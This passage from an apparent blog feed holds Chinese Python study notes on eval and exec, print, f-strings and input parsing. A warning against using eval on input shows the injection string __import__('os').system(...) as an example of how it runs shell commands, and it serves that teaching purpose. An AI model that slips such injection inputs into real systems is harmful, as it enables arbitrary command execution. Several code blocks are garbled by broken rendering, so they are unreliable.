class="built_in">eval</span>(user))</span><br><span class="line">Out[<span class="number">3</span>]: <span class="built_in">dict</span></span><br></pre></td></tr></table></figure></p></li><li><p><code>exec</code> 函数</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">4</span>]: <span class="built_in">exec</span>(<span class="string">f&quot;user_dict=<span class="subst">&#123;user&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">5</span>]: user_dict</span><br><span class="line">Out[<span class="number">5</span>]: &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;jim&#x27;</span>, <span class="string">&#x27;sex&#x27;</span>: <span class="string">&#x27;male&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">18</span>&#125;</span><br></pre></td></tr></table></figure></p></li></ol><h3 id="不要滥用-eval">不要滥用 eval</h3><blockquote><p>在开发时，千万不要使用 eval 直接转换 input 的结果</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure><p>等价代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&#x27;终端命令&#x27;</span>)</span><br></pre></td></tr></table></figure><p>执行成功，返回 0</p><p>执行失败，返回错误信息</p><p><a href="https://www.geeksforgeeks.org/eval-in-python/">eval inPython</a></p><h2 id="eval-alternative-function-reference">eval alternative: functionreference</h2><p>见 Python variables and parameters feature 一文 以及 <ahref="https://www.hackerrank.com/challenges/string-validators/forum">string-validators_forum</a></p><h2 id="any-函数">any 函数</h2><h3 id="definition-and-usage">Definition and Usage</h3><p>The <code>any()</code> function returns True if any item in aniterable are true(元素除了是 0、空、FALSE 外都算 TRUE。), otherwise itreturns False.</p><p>If the iterable object is empty, the <code>any()</code> function willreturn False.</p><h2 id="syntax">Syntax</h2><p>any(<em>iterable</em>)</p><h2 id="parameter-values">Parameter Values</h2><table><thead><tr class="header"><th>Parameter</th><th>Description</th></tr></thead><tbody><tr class="odd"><td><em>iterable</em></td><td>An iterable object (list, tuple, dictionary)</td></tr></tbody></table><p>Note: When used on a dictionary, the any() function checks if any ofthe keys are true, not the values.</p><h2 id="all-函数">all 函数</h2><p>The <code>all()</code> function returns True if all items in aniterable are true, otherwise it returns False.</p><p>If the iterable object is empty, the <code>all()</code> function alsoreturns True.</p><p>补充：</p><blockquote><p>语法糖（Syntacticsugar）是由英国计算机科学家彼得·兰丁发明的一个术语，指计算机语言中添加的某种语法，这种语法对语言的功能没有影响，但是更方便程序员使用。语法糖让程序更加简洁，有更高的可读性。--wikipedia</p></blockquote><p>参考推荐:</p><p><a href="https://www.zhihu.com/question/20125256">Lambda表达式有何用处？如何使用？</a> <ahref="https://foofish.net/lambda.html">什么时候使用 Lambda 函数？</a> <ahref="https://www.w3schools.com/python/ref_func_any.asp">Python any()Function</a> <ahref="https://www.w3schools.com/python/ref_func_all.asp">Python all()Function</a></p><p><a href="https://realpython.com/python-lambda/#lambda-calculus">Howto Use Python Lambda Functions</a></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python input/output</title>
      <link href="/blog/2020/03/22/programming/python/1.basic/2.%20io/"/>
      <url>/blog/2020/03/22/programming/python/1.basic/2.%20io/</url>
      
        <content type="html"><![CDATA[<ul class="task-list"><li><label><input type="checkbox" />待整理</label></li></ul><p>写程序的目的就是要与外界进行交互，通过输入输出来完成一定操作，从而解决一定的问题。因此，输入、输出的处理便是需要程序员掌握的一个重点内容。本文主要记录输入输出的相关函数以及常见编程方式。</p><h3 id="输出">输出</h3><p>print 作为 python中最常用输出函数，功能比较强大，所以单独记录，并练习一下。</p><h4 id="原理">原理</h4><p>当我们使用 <code>print(obj1, obj2)</code> 在 console上打印对象的时候，实质上调用的是<code>sys.stdout.write(obj1+" "+obj2+'\n')</code></p><p>Will be converted to string before printed</p><p><code>print</code>可以输出任意对象，但是需要先将其转换为字符串的原因是：<code>sys.stdout.write</code> 只能输出字符串。</p><p><code>sys.stdout.write</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">20</span>]: <span class="built_in">print</span>(<span class="string">&quot;hello&quot;</span>,<span class="string">&quot;world&quot;</span>)</span><br><span class="line">hello world</span><br><span class="line"></span><br><span class="line">In [<span class="number">23</span>]: sys.stdout.write(<span class="string">&quot;hello&quot;</span>+<span class="string">&quot; &quot;</span>+<span class="string">&quot;world&quot;</span>+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">hello world</span><br><span class="line">Out[<span class="number">23</span>]: <span class="number">12</span></span><br></pre></td></tr></table></figure><h3 id="syntax">Syntax</h3><p><code>print(object(s), sep=separator, end=end, file=file, flush=flush)</code></p><p>== <code>sys.stdout.write(str(object(s))+"\n")</code></p><h3 id="parameter-values">Parameter Values</h3><table><colgroup><col style="width: 14%" /><col style="width: 85%" /></colgroup><thead><tr class="header"><th style="text-align: center;"><em>object(s)</em></th><th>Any object, and as many as you like. Will be converted to stringbefore printed</th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">sep='<em>separator</em>'</td><td>Optional. Specify how to separate the objects, if there is more thanone. Default is ' '</td></tr><tr class="even"><td style="text-align: center;">end='<em>end</em>'</td><td>Optional. Specify what to print at the end. Default is '\n' (linefeed)</td></tr><tr class="odd"><td style="text-align: center;"><em>file</em></td><td>Optional. An object with a write method. Default is sys.stdout</td></tr><tr class="even"><td style="text-align: center;"><em>flush</em></td><td>Optional. A Boolean, specifying if the output is flushed (True) orbuffered (False). Default is False</td></tr></tbody></table><p>记录一下不熟悉且重要的参数的使用。</p><h3 id="separator">separator</h3><p>当 <code>print</code> 输出多个对象时， 默认是以空格分割，即:<code>sep=" "</code> , 如果想要修改，显式地添加该参数即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">31</span>]: <span class="built_in">print</span>(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>, sep=<span class="string">&quot;--&quot;</span>)</span><br><span class="line">hello--world</span><br></pre></td></tr></table></figure><h3 id="end">end</h3><p>控制打印的结尾，默认是： <code>end='\n'</code> ， 即:<code>print</code> 默认输出换行。 如果想要不换行， 显式修改 end 参数:<code>end=""</code></p><p>如果想打印以空格结尾，可以使用下面代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(obj1,obj2, end=<span class="string">&#x27; &#x27;</span>)</span><br></pre></td></tr></table></figure><p>end 默认是 '' ， 所以会输出空格</p><h3 id="file">file</h3><p>file 用来改变 print 输出流，默认输出到 <code>sys.stdout</code> 。它可以发挥两个重要作用：</p><ol type="1"><li><p>输出到 <code>stderr</code> (注：了解 stderr， 看文末扩展)</p><p>这个功能，日常小脚本用不到，但是做一些大点的项目的时候，还有有用的。</p></li><li><p>输出到外部文件，和 fp 指针的 write功能相似，但是注意：写二进制文件时，不能用它，需要使用文件的 write方法。</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">8</span>]: <span class="built_in">print</span>(<span class="string">&quot;Hello World&quot;</span>, file=sys.stderr)</span><br><span class="line">Hello World</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">13</span>]: <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;sample&quot;</span>, <span class="string">&quot;a&quot;</span>, encoding=<span class="string">&quot;utf8&quot;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    ...:     <span class="built_in">print</span>(<span class="string">&quot;Hello World&quot;</span>, file=fp)</span><br><span class="line">    ...:</span><br><span class="line"></span><br><span class="line">In [<span class="number">14</span>]: cat sample</span><br><span class="line">Hello World</span><br></pre></td></tr></table></figure><h3 id="flush">flush</h3><p>flush -- 输出是否被缓存通常决定于 file，但如果 flush 关键字参数为True，流会被强制刷新。 使用 flush 参数生成一个 Loading 的效果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;---RUNOOB EXAMPLE ： Loading 效果---&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Loading&quot;</span>,end = <span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;.&quot;</span>,end = <span class="string">&#x27;&#x27;</span>,flush = <span class="literal">True</span>)</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br></pre></td></tr></table></figure><p>参考自:<ahref="https://www.runoob.com/python3/python-func-print.html">Pythonprint() 函数</a></p><h3 id="print-重复打印">print 重复打印</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span>*<span class="number">25</span>)</span><br><span class="line">----------------------mathjax: true</span><br><span class="line">---```</span><br><span class="line"></span><br><span class="line"><span class="comment">### 垂直对齐</span></span><br><span class="line"></span><br><span class="line">使用制表符 `\t` 在垂直方向对齐。</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">In [<span class="number">8</span>]: <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">   ...:     <span class="built_in">print</span>(<span class="string">&quot;1\t2\t3&quot;</span>)</span><br><span class="line">   ...:     <span class="built_in">print</span>(<span class="string">&quot;12\t13\t14&quot;</span>)</span><br><span class="line">   ...:</span><br><span class="line"></span><br><span class="line">In [<span class="number">9</span>]: main()</span><br><span class="line"><span class="number">1</span>       <span class="number">2</span>       <span class="number">3</span></span><br><span class="line"><span class="number">12</span>      <span class="number">13</span>      <span class="number">14</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="f-string-格式化输出">f-string 格式化输出</h2><p>The idea behind f-strings is to make string interpolation simpler.F-strings provide a concise and convenient way to embed pythonexpressions inside string literals for formatting.</p><p>Note : F-strings are faster than the two most commonly used stringformatting mechanisms, which are % formatting and str.format().</p><h3 id="simple-syntax">Simple Syntax</h3><p>f-string 的使用几乎和 <code>str.format()</code> 使用方式几乎类似,当然， 使用大写 <code>F</code> 也可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">17</span>]: hug = <span class="string">&quot;hello&quot;</span></span><br><span class="line">In [<span class="number">18</span>]: year = <span class="number">2020</span></span><br><span class="line">In [<span class="number">20</span>]: <span class="string">f&quot;<span class="subst">&#123;hug&#125;</span> <span class="subst">&#123;year&#125;</span>&quot;</span></span><br><span class="line">Out[<span class="number">20</span>]: <span class="string">&#x27;hello 2020&#x27;</span></span><br></pre></td></tr></table></figure><p>初学者往往误将字符串和其他类型，如：字符串，异常类型进行拼接，从而得到一下错误:<code>TypeError: can only concatenate str (not "int") to str</code> ,这是由于 Python</p><h3 id="arbitrary-expression">arbitrary expression</h3><p>由于 f 字符串是在运行时进行计算的，因此可将任何有效的 Python表达式放入其中。</p><h4 id="arithmetic">arithmetic</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">29</span>]: <span class="string">f&quot;<span class="subst">&#123;<span class="number">2020</span>//<span class="number">521</span>&#125;</span> You Me &amp; Her <span class="subst">&#123;<span class="number">2</span>*<span class="number">5</span>//<span class="number">10</span>&#125;</span>&quot;</span></span><br><span class="line">Out[<span class="number">29</span>]: <span class="string">&#x27;3 You Me &amp; Her 1&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="function">function</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">double_value</span>(<span class="params">value</span>):</span><br><span class="line">    <span class="keyword">return</span> value*value</span><br><span class="line">num = <span class="number">4</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;double_value(num)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="method">method</h3><p>You also have the option of calling a method directly:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">38</span>]: test</span><br><span class="line">Out[<span class="number">38</span>]: <span class="string">&#x27;www.google.com&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">39</span>]: <span class="string">f&quot;<span class="subst">&#123;test.upper()&#125;</span>&quot;</span></span><br><span class="line">Out[<span class="number">39</span>]: <span class="string">&#x27;WWW.GOOGLE.COM&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="user-defined-class">user-defined class</h3><p>You could even use objects created from classes with f-strings.Imagine you had the following class: --见文末的原文(链接)，类还没好好学，先不看它。</p><h3 id="multiline-f-strings">Multiline f-Strings</h3><p>Remember that you need to place an f in front of each line of amultiline string.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>name = <span class="string">&quot;Eric&quot;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>profession = <span class="string">&quot;comedian&quot;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>affiliation = <span class="string">&quot;Monty Python&quot;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>message = (</span><br><span class="line"><span class="meta">... </span>    <span class="string">f&quot;Hi <span class="subst">&#123;name&#125;</span>. &quot;</span></span><br><span class="line"><span class="meta">... </span>    <span class="string">f&quot;You are a <span class="subst">&#123;profession&#125;</span>. &quot;</span></span><br><span class="line"><span class="meta">... </span>    <span class="string">f&quot;You were in <span class="subst">&#123;affiliation&#125;</span>.&quot;</span></span><br><span class="line"><span class="meta">... </span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>message</span><br><span class="line"><span class="string">&#x27;Hi Eric. You are a comedian. You were in Monty Python.&#x27;</span></span><br></pre></td></tr></table></figure><p>If you want to spread strings over multiple lines, you also have theoption of escaping a return with a <code>\</code> :</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; message = f&quot;Hi &#123;name&#125;. &quot; \</span><br><span class="line">...           f&quot;You are a &#123;profession&#125;. &quot; \</span><br><span class="line">...           f&quot;You were in &#123;affiliation&#125;.&quot;</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; message</span><br><span class="line">&#x27;Hi Eric. You are a comedian. You were in Monty Python.&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>But this is what will happen if you use <code>"""</code> :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>message = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>    Hi <span class="subst">&#123;name&#125;</span>.</span></span><br><span class="line"><span class="string"><span class="meta">... </span>    You are a <span class="subst">&#123;profession&#125;</span>.</span></span><br><span class="line"><span class="string"><span class="meta">... </span>    You were in <span class="subst">&#123;affiliation&#125;</span>.</span></span><br><span class="line"><span class="string"><span class="meta">... </span>&quot;&quot;&quot;</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>message</span><br><span class="line"><span class="string">&#x27;\n    Hi Eric.\n    You are a comedian.\n    You were in Monty Python.\n&#x27;</span></span><br></pre></td></tr></table></figure><p>多行字符串会包含跨行每行开头的缩进</p><h3 id="dictionaries">Dictionaries</h3><p>如果 f-string 中需要使用和外围一样的引号（单双引号）时，可以使用<code>\</code> 转义。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>comedian = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Eric Idle&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">74</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">f&quot;The comedian is <span class="subst">&#123;comedian[<span class="string">&#x27;name&#x27;</span>]&#125;</span>, aged <span class="subst">&#123;comedian[<span class="string">&#x27;age&#x27;</span>]&#125;</span>.&quot;</span></span><br><span class="line">The comedian <span class="keyword">is</span> Eric Idle, aged <span class="number">74.</span></span><br></pre></td></tr></table></figure><p>If you use the same type of quotation mark around the dictionary keysas you do on the outside of the f-string, then the quotation mark at thebeginning of the first dictionary key will be interpreted as the end ofthe string.</p><h3 id="braces">Braces</h3><p>In order to make a brace appear in your string, you must use doublebraces:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">f&quot;&#123;&#123;74&#125;&#125;&quot;</span></span><br><span class="line"><span class="string">&#x27;&#123;74&#125;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Note that using triple braces will result in there being only singlebraces in your string:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">f&quot;&#123;&#123;<span class="subst">&#123;<span class="number">74</span>&#125;</span>&#125;&#125;&quot;</span></span><br><span class="line"><span class="string">&#x27;&#123;74&#125;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>However, you can get more braces to show if you use more than triplebraces:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">f&quot;&#123;&#123;&#123;&#123;74&#125;&#125;&#125;&#125;&quot;</span></span><br><span class="line"><span class="string">&#x27;&#123;&#123;74&#125;&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="backslashes">Backslashes</h3><p>As you saw earlier, it is possible for you to use backslash escapesin the string portion of an f-string. However, you can’t use backslashesto escape in the expression part of an f-string:</p><p>Note: Backslash Cannot be used in format string directly.(<code>\</code> 不能直接用在 {} 里面)<code>f"newline: &#123;ord('\n')&#125;"</code> 这样会报错 But the documentationpoints out that we can put the backslash into a variable as a workaroundthough :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">newline = <span class="built_in">ord</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">f&quot;newline: <span class="subst">&#123;newline&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure><h3 id="inline-comments">Inline Comments</h3><p>Expressions should not include comments using the <code>##</code>symbol. You’ll get a syntax error:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">f&quot;Eric is <span class="subst">&#123;<span class="number">2</span> * <span class="number">37</span> ##Oh my!&#125;</span>.&quot;</span></span><br><span class="line"></span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span></span><br><span class="line">    <span class="string">f&quot;Eric is <span class="subst">&#123;<span class="number">2</span> * <span class="number">37</span> ##Oh my!&#125;</span>.&quot;</span></span><br><span class="line"></span><br><span class="line">                                ^</span><br><span class="line">SyntaxError: f-string expression part cannot include <span class="string">&#x27;##&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="进制">进制</h2><p>题目： <ahref="https://www.hackerrank.com/challenges/python-string-formatting/problem">string-formatting</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">print_formatted</span>(<span class="params">number</span>):</span><br><span class="line">    width = <span class="built_in">len</span>(<span class="string">f&quot;<span class="subst">&#123;number:b&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, number+<span class="number">1</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;i:&#123;width&#125;</span>d&#125; <span class="subst">&#123;i:&#123;width&#125;</span>o&#125; <span class="subst">&#123;i:&#123;width&#125;</span>X&#125; <span class="subst">&#123;i:&#123;width&#125;</span>b&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    n = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">    print_formatted(n)</span><br></pre></td></tr></table></figure><h2 id="输入">输入</h2><ol type="1"><li><p>Problem 1:</p><p><ahref="https://www.hackerrank.com/challenges/finding-the-percentage/problem">finding-the-percen</a>tage</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">        n = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">        student_marks = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            name, *line = <span class="built_in">input</span>().split()</span><br><span class="line">            scores = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">float</span>, line))</span><br><span class="line">            student_marks[name] = scores</span><br><span class="line">        query_name = <span class="built_in">input</span>()</span><br><span class="line">    ```</span><br><span class="line"></span><br><span class="line">    <span class="number">1.</span> 已知读入的数据的个数，可以使用 <span class="keyword">for</span> 循环读取，使用 `_` （一般指不需要用到的变量）作为每次迭代的结果变量。</span><br><span class="line">    <span class="number">2.</span> 使用 `<span class="built_in">input</span>().split()` 将读入的一行以空格（或制表符）分隔的字符串（ `<span class="built_in">input</span>()` 遇到回车结束）分裂为字符(串) 列表。</span><br><span class="line">    <span class="number">3.</span> 在函数名前加 `*` ， 标识可以接受多值作为元组</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> Problem <span class="number">2</span>:</span><br><span class="line"></span><br><span class="line">    [处理输入 案例<span class="number">2</span>](https://www.hackerrank.com/challenges/find-second-maximum-number-<span class="keyword">in</span>-a-<span class="built_in">list</span>/problem):</span><br><span class="line"></span><br><span class="line">``` python</span><br><span class="line">    num = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"></span><br><span class="line">    score = [<span class="built_in">int</span>(n) <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">input</span>().split()][:num]</span><br><span class="line">    ```</span><br><span class="line"></span><br><span class="line">    或者</span><br><span class="line"></span><br><span class="line">``` python</span><br><span class="line">    num = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">    score =<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>,<span class="built_in">input</span>().split()))[:num]</span><br><span class="line">    ```</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> Problem <span class="number">3</span>:</span><br><span class="line"></span><br><span class="line">    [python3——读取以空格分隔的一行整数](https://blog.csdn.net/u013595395/article/details/<span class="number">88425996</span>)</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span> Problem <span class="number">4</span></span><br><span class="line"></span><br><span class="line">[Symmetric Difference](https://www.hackerrank.com/challenges/symmetric-difference/forum)</span><br><span class="line"></span><br><span class="line">将以下输入的第二行和第四行分别转换为字典</span><br><span class="line"></span><br><span class="line">```txt</span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">2</span> <span class="number">4</span> <span class="number">5</span> <span class="number">9</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">2</span> <span class="number">4</span> <span class="number">11</span> <span class="number">12</span></span><br></pre></td></tr></table></figure><p>方法：<code>a,b = [set(input().split()) for _ in range(4)][1::2]</code></p><p>首先使用 for 循环读取到列表，然后取列表的第 2，4 项</p><h2 id="输出案例">输出案例</h2><ol type="1"><li>将多个数字列表空格分隔输出，结尾无空格,不同列表用换行分隔</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot; &quot;</span>.join(<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> xlist))</span><br></pre></td></tr></table></figure><h2 id="参考推荐">参考推荐</h2><p><a href="https://realpython.com/python-f-strings/">f-strings inPython 3 – Formatted string literal</a> <ahref="https://blog.csdn.net/sunxb10/article/details/81036693">Python格式化字符串 f-string 概览</a> <a href="https://pyformat.info/">PyFormatUsing % and .format() for great good!</a></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Sequence unpacking</title>
      <link href="/blog/2020/03/22/programming/python/1.basic/7.seq_unpacking/"/>
      <url>/blog/2020/03/22/programming/python/1.basic/7.seq_unpacking/</url>
      
